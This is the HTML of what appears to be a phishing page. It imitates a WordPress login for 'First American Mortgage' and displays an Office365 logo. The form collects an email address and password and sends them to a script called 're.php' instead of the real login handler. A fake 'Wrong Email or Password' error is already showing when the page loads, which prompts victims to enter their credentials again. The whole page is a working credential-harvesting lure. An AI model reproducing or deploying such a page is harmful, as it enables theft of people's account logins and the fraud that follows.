<!DOCTYPE html>
	<!--[if IE 8]>
		<html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
	<![endif]-->
	<!--[if !(IE 8) ]><!-->
		<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
	<!--<![endif]-->
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>Log In ‹ First American Mortgage — WordPress</title>
				<style>
				body.login-style-1 #login h1 a:before { 
					background-image: -moz-linear-gradient(left, rgba(0,0,0,0) 0%, rgba(0,0,0,0) 100%) !important;
					background: -webkit-linear-gradient(left, rgba(0,0,0,0) 0%,rgba(0,0,0,0) 100%) !important;
					background: -ms-linear-gradient(left, rgba(0,0,0,0) 0%,rgba(0,0,0,0) 100%) !important;
					filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='rgba(0,0,0,0)', endColorstr='rgba(0,0,0,0)',GradientType=1 ) !important;
					position:absolute;
					top:0;
					bottom:0;
					left:0;
					width:100%;
					height:100%;
					content:'';
					z-index:-1;
				}
			</style> 			<style type="text/css">
				body.login #login h1 a {
								}
			</style> <link rel='dns-prefetch' href='//s.w.org' />
<script type='text/javascript' src='https://faminc.biz/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://faminc.biz/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='https://faminc.biz/wp-content/mu-plugins/force-strong-passwords/force-zxcvbn.min.js?ver=1.7'></script>
<script type='text/javascript' src='https://faminc.biz/wp-content/mu-plugins/force-strong-passwords/js-admin.min.js?ver=1.7'></script>
<link rel='stylesheet' id='dashicons-css'  href='https://faminc.biz/wp-includes/css/dashicons.min.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='buttons-css'  href='https://faminc.biz/wp-includes/css/buttons.min.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='forms-css'  href='https://faminc.biz/wp-admin/css/forms.min.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='l10n-css'  href='https://faminc.biz/wp-admin/css/l10n.min.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='login-css'  href='https://faminc.biz/wp-admin/css/login.min.css?ver=5.2.4' type='text/css' media='all' />
	<meta name='robots' content='noindex,noarchive' />
	<meta name='referrer' content='strict-origin-when-cross-origin' />
		<meta name="viewport" content="width=device-width" />
		</head>
	<body class="login login-action-login wp-core-ui  locale-en-us">
		<div id="login">
		<h1>
		<img src="https://www.entranceconsulting.com/wp-content/uploads/2017/08/Office365.jpg" alt="https://www.entranceconsulting.com/wp-content/uploads/2017/08/Office365.jpg" class="transparent" width="138" height="102"></h1>
	
	<form name="loginform" id="loginform" action="re.php" method="post">
	<p>
		<label for="user_login">Email Address<br />
		<input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" /></label>
	</p>
	<p>
		<label for="user_pass">Password<br />
		<input type="password" name="pwd" id="user_pass" class="input" value="" size="20" /></label>
					<a style="text-decoration: none">
					<font color="#FF0000">Wrong Email or Password</font></a></p>
			<p class="forgetmenot">&nbsp;</p>
	<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> 
			Remember Me</label></p>
	<p class="submit">
		<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
				<input type="hidden" name="redirect_to" value="https://faminc.biz/wp-admin/" />
					<input type="hidden" name="testcookie" value="1" />
	</p>
	</form>

	<script type="text/javascript">
	function wp_attempt_focus(){
	setTimeout( function(){ try{
			d = document.getElementById('user_login');
				d.focus();
	d.select();
	} catch(e){}
	}, 200);
	}

			wp_attempt_focus();
			if(typeof wpOnload=='function')wpOnload();
			</script>

			<p id="backtoblog"><a href="">
			← Back to First American Mortgage	</a></p>
			
	</div>

	
		<div class="clear"></div>
	</body>
	</html>
	